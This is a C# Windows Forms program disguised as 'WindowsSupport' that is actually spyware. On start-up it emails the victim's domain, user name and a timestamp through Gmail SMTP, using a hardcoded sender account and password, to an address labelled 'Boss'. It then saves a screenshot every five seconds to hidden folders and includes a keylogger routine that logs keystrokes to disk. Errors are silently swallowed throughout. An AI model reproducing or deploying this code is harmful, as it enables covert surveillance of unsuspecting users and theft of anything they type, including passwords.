using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace WindowsSupport
{
    public partial class frmMain : Form
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        public frmMain()
        {
            InitializeComponent();

            if (!Directory.Exists(@"D:\Temp"))
            {
                Directory.CreateDirectory(@"D:\Temp");
            }
            if (!Directory.Exists(@"D:\Temp\Images"))
            {
                Directory.CreateDirectory(@"D:\Temp\Images");
            }
            if (!Directory.Exists(@"D:\Temp\Logs"))
            {
                Directory.CreateDirectory(@"D:\Temp\Logs");
            }
            MailAddress from = new MailAddress("neverdie000000@gmail.com", "hacker");
            MailAddress to = new MailAddress("quyetphamit@gmail.com", "Boss");
            List<MailAddress> cc = new List<MailAddress>();
            cc.Add(new MailAddress("boybkpro@gmail.com"));
            StringBuilder buider = new StringBuilder();
            buider.Append(Environment.UserDomainName);
            buider.Append(" ");
            buider.Append(Environment.UserName);
            buider.Append(" ");
            buider.Append(DateTime.Now);
            SendEmail("Dear Boss", buider.ToString(), from, to, cc);
            //Start();
            System.Windows.Forms.Timer t = new System.Windows.Forms.Timer();
            t.Interval = 5000;
            t.Tick += T_Tick;
            t.Start();
     
        }

        private void T_Tick(object sender, EventArgs e)
        {
            PrintScreen();
        }
        private void PrintScreen()
        {
            try
            {
                Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                        Screen.PrimaryScreen.Bounds.Height);
                Graphics graphics = Graphics.FromImage(bitmap as Image);
                graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                var date = DateTime.Now.ToString("MMddyyHmmss");
                bitmap.Save(@"D:\Temp\Images\" + date + ".jpg", ImageFormat.Jpeg);
            }
            catch
            {

            }
        }
        protected void SendEmail(string _subject, string _body, MailAddress _from, MailAddress _to, List<MailAddress> _cc, List<MailAddress> _bcc = null)
        {
            try
            {
                SmtpClient mailClient = new SmtpClient("smtp.gmail.com", 587);
                mailClient.UseDefaultCredentials = false;
                mailClient.EnableSsl = true;
                mailClient.Credentials = new System.Net.NetworkCredential("neverdie000000@gmail.com", "abc@#123");
                MailMessage msgMail;
                msgMail = new MailMessage();
                msgMail.From = _from;
                msgMail.To.Add(_to);
                _cc.ForEach(r =>
                {
                    msgMail.CC.Add(r);
                });
                if (_bcc != null)
                {
                    _bcc.ForEach(r => { msgMail.Bcc.Add(r); });
                }
                msgMail.Subject = _subject;
                msgMail.Body = _body;
                msgMail.IsBodyHtml = true;
                mailClient.Send(msgMail);
                msgMail.Dispose();
            }
            catch
            {

            }
        }
        static void Start()
        {
            try
            {
                while (true)
                {
                    Thread.Sleep(10);
                    for (Int32 i = 0; i < 255; i++)
                    {
                        int keyState = GetAsyncKeyState(i);
                        if (keyState == 1 || keyState == -32767)
                        {
                            Console.WriteLine((Keys)i);
                            string toStringKeys = Convert.ToString((Keys)i);
                            //File.AppendAllText(Application.StartupPath + "\\Logs.txt", Environment.NewLine + toStringKeys);
                            File.AppendAllText(@"D:\Temp\Logs\Logs.txt", Environment.NewLine + toStringKeys);
                            break;
                        }
                    }
                }
            }
            catch
            {
            }
        }
    }
}
